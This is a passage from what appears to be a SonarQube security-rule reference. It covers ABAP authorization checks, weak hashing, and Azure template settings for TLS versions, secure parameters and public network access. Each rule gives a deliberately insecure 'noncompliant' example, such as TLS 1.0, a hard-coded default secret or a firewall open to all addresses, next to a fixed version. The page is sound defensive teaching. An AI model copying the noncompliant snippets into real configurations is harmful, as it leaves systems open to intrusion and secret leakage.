  WAIT UNTIL g_nb_return EQ wv_nb_call.
ENDIF.
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S2809">
              abap:S2809
            </a>
          </td>
          <td>
            <details>
              <p>Using &#34;CALL TRANSACTION&#34; statements without an authority check is security sensitive. Its access should be restricted to specific users.</p>
<p>This rule raises when a <code>CALL TRANSACTION</code> has no explicit authorization check, i.e. when:</p>
<ul><li> the <code>CALL TRANSACTION</code> statement is not followed by <code>WITH AUTHORITY-CHECK</code>. </li><li> the <code>CALL TRANSACTION</code> statement is not following an <code>AUTHORITY-CHECK</code> statement. </li><li> the <code>CALL TRANSACTION</code> statement is not following a call to the <code>AUTHORITY_CHECK_TCODE</code> function. </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> the <code>CALL TRANSACTION</code> statement is restricted to the right users. </li></ul>
<p>There is a risk if you answered no to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Check current user’s authorization before every <code>CALL TRANSACTION</code> statement. Since ABAP 7.4 this should be done by appending <code>WITH
AUTHORITY-CHECK</code> to <code>CALL TRANSACTION</code> statements. In earlier versions the <code>AUTHORITY-CHECK</code> statement or a call to the
<code>AUTHORITY_CHECK_TCODE</code> function can be used.</p>
<p>Note that since ABAP 7.4 any <code>CALL TRANSACTION</code> statement not followed by <code>WITH AUTHORITY-CHECK</code> or <code>WITHOUT
AUTHORITY-CHECK</code> <a href="https://help.sap.com/doc/abapdocu_751_index_htm/7.51/en-US/abapcall_transaction_authority.htm" rel="nofollow">is obsolete</a>.</p>
<h2>Sensitive Code Example</h2>
<pre>
CALL TRANSACTION &#39;MY_DIALOG&#39;.  &#34; Sensitive as there is no apparent authorization check. It is also obsolete since ABAP 7.4.
</pre>
<h2>Compliant Solution</h2>
<pre>
AUTHORITY-CHECK OBJECT &#39;S_DIAGID&#39;
                  ID &#39;ACTVT&#39; FIELD &#39;03&#39;.
IF sy-subrc &lt;&gt; 0.
  &#34; show an error message...
ENDIF.

CALL TRANSACTION &#39;MY_DIALOG&#39;. &#34; Ok but obsolete since ABAP 7.4.
</pre>
<p>or</p>
<pre>
CALL FUNCTION &#39;AUTHORITY_CHECK_TCODE&#39;
  exporting
    tcode  &#61; up_fdta
  exceptions
    ok     &#61; 0
    others &#61; 4.
IF sy-subrc &lt;&gt; 0.
  &#34; show an error message...
ENDIF.

CALL TRANSACTION up_fdta USING up_bdc mode &#39;E&#39;. &#34; Ok but obsolete since ABAP 7.4.
</pre>
<p>or</p>
<pre>
CALL TRANSACTION &#39;MY_DIALOG&#39; WITH AUTHORITY-CHECK. &#34; Recommended way since ABAP 7.4.
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised when <code>CALL TRANSACTION</code> is followed by <code>WITHOUT AUTHORITY-CHECK</code> as it explicitly says that the
TRANSACTION does not require an authorization check.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/285" rel="nofollow">MITRE, CWE-285</a> - Improper Authorization </li><li> <a href="https://cwe.mitre.org/data/definitions/862" rel="nofollow">MITRE, CWE-862</a> - Missing Authorization </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=abap:S4790">
              abap:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<p>This rule raises an issue when <code>MD5_CALCULATE_HASH_FOR_RAW</code> or <code>MD5_CALCULATE_HASH_FOR_CHAR</code> functions are used.</p>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S4423">
              azureresourcemanager:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Databases</h2>
<h3>Code examples</h3>
<p>The following code samples are equivalent For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformysql/servers" rel="nofollow">Azure
Database for MySQL servers</a>, <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbforpostgresql/servers" rel="nofollow">Azure Database for
PostgreSQL servers</a>, and <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.dbformariadb/servers" rel="nofollow">Azure Database for MariaDB
servers</a>.</p>
<p>For all of these, there is no minimal TLS version enforced by default.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DBforMySQL/servers&#34;,
      &#34;apiVersion&#34;: &#34;2017-12-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;minimalTlsVersion&#34;: &#34;TLS1_0&#34;
      }
    }
  ]
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DBforMySQL/servers&#34;,
      &#34;apiVersion&#34;: &#34;2017-12-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;minimalTlsVersion&#34;: &#34;TLS1_2&#34;
      }
    }
  ]
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6656">
              azureresourcemanager:S6656
            </a>
          </td>
          <td>
            <details>
              <p>When using nested deployments in Azure, template expressions can be evaluated within the scope of the parent template or the scope of the nested
template. If such a template expression evaluates a secure value of the parent template, it is possible to expose this value in the deployment
history.</p>
<h2>Why is this an issue?</h2>
<p>Parameters with the type <code>securestring</code> and <code>secureObject</code> are designed to pass sensitive data to the resources being
deployed. Secure parameters cannot be accessed after the deployment is completed: they can neither be logged nor used as an output.</p>
<p>When used in nested deployments, however, it is possible to embed secure parameters in such a way they can be visible afterward.</p>
<h3>What is the potential impact?</h3>
<p>If the nested deployment contains a secure parameter in this way, then the value of this parameter may be readable in the deployment history. This
can lead to important credentials being leaked to unauthorized accounts.</p>
<h2>How to fix it in ARM Templates</h2>
<p>By setting <code>properties.expressionEvaluationOptions.scope</code> to <code>Inner</code> in the parent template, template evaluations are limited
to the scope of the nested template. This makes it impossible to expose secure parameters defined in the parent template.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;parameters&#34;: {
    &#34;adminUsername&#34;: {
      &#34;type&#34;: &#34;securestring&#34;,
      &#34;defaultValue&#34;: &#34;[newGuid()]&#34;
    }
  },
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Resources/deployments&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;mode&#34;: &#34;Incremental&#34;,
        &#34;template&#34;: {
          &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
          &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
          &#34;resources&#34;: [
            {
              &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
              &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
              &#34;properties&#34;: {
                &#34;osProfile&#34;: {
                  &#34;adminUsername&#34;: &#34;[parameters(&#39;adminUsername&#39;)]&#34;
                }
              }
            }
          ]
        }
      }
    }
  ]
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Resources/deployments&#34;,
      &#34;apiVersion&#34;: &#34;2022-09-01&#34;,
      &#34;properties&#34;: {
        &#34;expressionEvaluationOptions&#34;: {
          &#34;scope&#34;: &#34;Inner&#34;
        },
        &#34;mode&#34;: &#34;Incremental&#34;,
        &#34;template&#34;: {
          &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
          &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
          &#34;parameters&#34;: {
            &#34;adminUsername&#34;: {
              &#34;type&#34;: &#34;securestring&#34;,
              &#34;defaultValue&#34;: &#34;[newGuid()]&#34;
            }
          },
          &#34;resources&#34;: [
            {
              &#34;type&#34;: &#34;Microsoft.Compute/virtualMachines&#34;,
              &#34;apiVersion&#34;: &#34;2022-11-01&#34;,
              &#34;properties&#34;: {
                &#34;osProfile&#34;: {
                  &#34;adminUsername&#34;: &#34;[parameters(&#39;adminUsername&#39;)]&#34;
                }
              }
            }
          ]
        }
      }
    }
  ]
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> Microsoft Learn - <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.resources/deployments?pivots&#61;deployment-language-arm-template" rel="nofollow"><code>Microsoft.Resources/deployments</code></a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/532" rel="nofollow">MITRE, CWE-532</a> - Insertion of Sensitive Information into Log File </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6648">
              azureresourcemanager:S6648
            </a>
          </td>
          <td>
            <details>
              <p>Azure Resource Manager templates define parameters as a way to reuse templates in different environments. Secure parameters (secure strings and
secure objects) should not be assigned a default value.</p>
<h2>Why is this an issue?</h2>
<p>Parameters with the type <code>securestring</code> and <code>secureObject</code> are designed to pass sensitive data to the resources being
deployed. Unlike other data types, they cannot be accessed after the deployment is completed. They can neither be logged nor used as an output.</p>
<p>Secure parameters can be assigned a default value which will be used if the parameter is not supplied. This default value is not protected and is
stored in cleartext in the deployment history.</p>
<h3>What is the potential impact?</h3>
<p>If the default value contains a secret, it will be disclosed to all accounts that have read access to the deployment history.</p>
<h2>How to fix it in ARM templates</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;parameters&#34;: {
    &#34;secretValue&#34;: {
      &#34;type&#34;: &#34;securestring&#34;,
      &#34;defaultValue&#34;: &#34;S3CR3T&#34;
    }
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;parameters&#34;: {
    &#34;secretValue&#34;: {
      &#34;type&#34;: &#34;securestring&#34;
    }
  }
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/data-types" rel="nofollow">Data types in ARM templates</a> </li><li> <a href="https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/best-practices#security-recommendations-for-parameters" rel="nofollow">ARM
  template best practices - Security recommendations for parameters</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/532" rel="nofollow">MITRE, CWE-532</a> - Insertion of Sensitive Information into Log File </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6329">
              azureresourcemanager:S6329
            </a>
          </td>
          <td>
            <details>
              <p>Enabling public network access to cloud resources can affect an organization’s ability to protect its data or internal operations from data theft
or disruption.</p>
<p>Depending on the component, inbound access from the Internet can be enabled via:</p>
<ul><li> a boolean value that explicitly allows access to the public network. </li><li> the assignment of a public IP address. </li><li> database firewall rules that allow public IP ranges. </li></ul>
<p>Deciding to allow public access may happen for various reasons such as for quick maintenance, time saving, or by accident.</p>
<p>This decision increases the likelihood of attacks on the organization, such as:</p>
<ul><li> data breaches. </li><li> intrusions into the infrastructure to permanently steal from it. </li><li> and various malicious traffic, such as DDoS attacks. </li></ul>
<h2>Ask Yourself Whether</h2>
<p>This cloud resource:</p>
<ul><li> should be publicly accessible to any Internet user. </li><li> requires inbound traffic from the Internet to function properly. </li></ul>
<p>There is a risk if you answered no to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid publishing cloud services on the Internet unless they are intended to be publicly accessible, such as customer portals or e-commerce
sites.</p>
<p>Use private networks (and associated private IP addresses) and VPC peering or other secure communication tunnels to communicate with other cloud
components.</p>
<p>The goal is to prevent the component from intercepting traffic coming in via the public IP address. If the cloud resource does not support the
absence of a public IP address, assign a public IP address to it, but do not create listeners for the public IP address.</p>
<h2>Sensitive Code Example</h2>
<p>Using <code>publicNetworkAccess</code> to control access to resources:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource exampleSite &#34;Microsoft.Web/sites&#64;2020-12-01&#34; {
  name: &#39;example-site&#39;
  properties: {
    publicNetworkAccess: &#39;Enabled&#39;
  }
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2020-12-01&#34;,
      &#34;name&#34;: &#34;example-site&#34;,
      &#34;properties&#34;: {
        &#34;siteConfig&#34;: {
          &#34;publicNetworkAccess&#34;: &#34;Enabled&#34;
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2020-12-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;resources&#34;: [
        {
          &#34;type&#34;: &#34;config&#34;,
          &#34;apiVersion&#34;: &#34;2020-12-01&#34;,
          &#34;name&#34;: &#34;example-config&#34;,
          &#34;properties&#34;: {
            &#34;publicNetworkAccess&#34;: &#34;Enabled&#34;
          }
        }
      ]
    }
  ]
}
</pre>
<p>Using IP address ranges to control access to resources:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
resource exampleFirewall &#34;Microsoft.Sql/servers/firewallRules&#64;2014-04-01&#34; {
  name: &#39;example-firewall&#39;
  properties: {
    startIpAddress: &#39;0.0.0.0&#39;
    endIpAddress: &#39;255.255.255.255&#39;
  }
}
</pre>
<pre data-diff-id="5" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Sql/servers/firewallRules&#34;,
      &#34;apiVersion&#34;: &#34;2014-04-01&#34;,
      &#34;name&#34;: &#34;example-firewall&#34;,
      &#34;properties&#34;: {
        &#34;startIpAddress&#34;: &#34;0.0.0.0&#34;,
        &#34;endIpAddress&#34;: &#34;255.255.255.255&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="6" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Sql/servers&#34;,
      &#34;apiVersion&#34;: &#34;2014-04-01&#34;,
      &#34;name&#34;: &#34;example-database&#34;,
      &#34;resources&#34;: [
        {
          &#34;type&#34;: &#34;firewallRules&#34;,
          &#34;apiVersion&#34;: &#34;2014-04-01&#34;,
          &#34;name&#34;: &#34;example-firewall&#34;,
          &#34;properties&#34;: {
            &#34;startIpAddress&#34;: &#34;0.0.0.0&#34;,
            &#34;endIpAddress&#34;: &#34;255.255.255.255&#34;
          }
        }
      ]
    }
  ]
}
</pre>
<h2>Compliant Solution</h2>
<p>Using <code>publicNetworkAccess</code> to control access to resources:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource exampleSite &#34;Microsoft.Web/sites&#64;2020-12-01&#34; {
  name: &#39;example-site&#39;
  properties: {
    publicNetworkAccess: &#39;Disabled&#39;
  }
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2020-12-01&#34;,
      &#34;name&#34;: &#34;example-site&#34;,
      &#34;properties&#34;: {
        &#34;siteConfig&#34;: {
          &#34;publicNetworkAccess&#34;: &#34;Disabled&#34;
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2020-12-01&#34;,
      &#34;name&#34;: &#34;example-site&#34;,
      &#34;resources&#34;: [
        {
          &#34;type&#34;: &#34;config&#34;,
          &#34;apiVersion&#34;: &#34;2020-12-01&#34;,
          &#34;name&#34;: &#34;example-config&#34;,
          &#34;properties&#34;: {
            &#34;publicNetworkAccess&#34;: &#34;Disabled&#34;
          }
        }
      ]
    }
  ]
}
</pre>
<p>Using IP address ranges to control access to resources:</p>
<pre data-diff-id="4" data-diff-type="compliant">
resource exampleFirewall &#34;Microsoft.Sql/servers/firewallRules&#64;2014-04-01&#34; {
  name: &#39;example-firewall&#39;
  properties: {
    startIpAddress: &#39;192.168.0.0&#39;
    endIpAddress: &#39;192.168.255.255&#39;
  }
}
</pre>
<pre data-diff-id="5" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Sql/servers/firewallRules&#34;,
      &#34;apiVersion&#34;: &#34;2014-04-01&#34;,
      &#34;name&#34;: &#34;example-firewall&#34;,
      &#34;properties&#34;: {
        &#34;startIpAddress&#34;: &#34;192.168.0.0&#34;,
        &#34;endIpAddress&#34;: &#34;192.168.255.255&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="6" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Sql/servers&#34;,
      &#34;apiVersion&#34;: &#34;2014-04-01&#34;,
      &#34;name&#34;: &#34;example-database&#34;,
      &#34;resources&#34;: [
        {
          &#34;type&#34;: &#34;firewallRules&#34;,
          &#34;apiVersion&#34;: &#34;2014-04-01&#34;,
          &#34;name&#34;: &#34;example-firewall&#34;,
          &#34;properties&#34;: {
            &#34;startIpAddress&#34;: &#34;192.168.0.0&#34;,
            &#34;endIpAddress&#34;: &#34;192.168.255.255&#34;
          }
        }
      ]
    }
  ]
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html" rel="nofollow">AWS Documentation</a> - Amazon EC2 instance IP
  addressing </li><li> <a href="https://docs.aws.amazon.com/dms/latest/userguide/CHAP_ReplicationInstance.PublicPrivate.html" rel="nofollow">AWS Documentation</a> - Public and
  private replication instances </li><li> <a href="https://docs.aws.amazon.com/vpc/latest/peering/what-is-vpc-peering.html" rel="nofollow">AWS Documentation</a> - VPC Peering </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6378">
              azureresourcemanager:S6378
            </a>
          </td>
          <td>
            <details>
              <p>Disabling Managed Identities can reduce an organization’s ability to protect itself against configuration faults and credentials leaks.</p>
<p>Authenticating via managed identities to an Azure resource solely relies on an API call with a non-secret token. The process is inner to Azure:
secrets used by Azure are not even accessible to end-users.</p>
<p>In typical scenarios without managed identities, the use of credentials can lead to mistakenly leaving them in code bases. In addition,
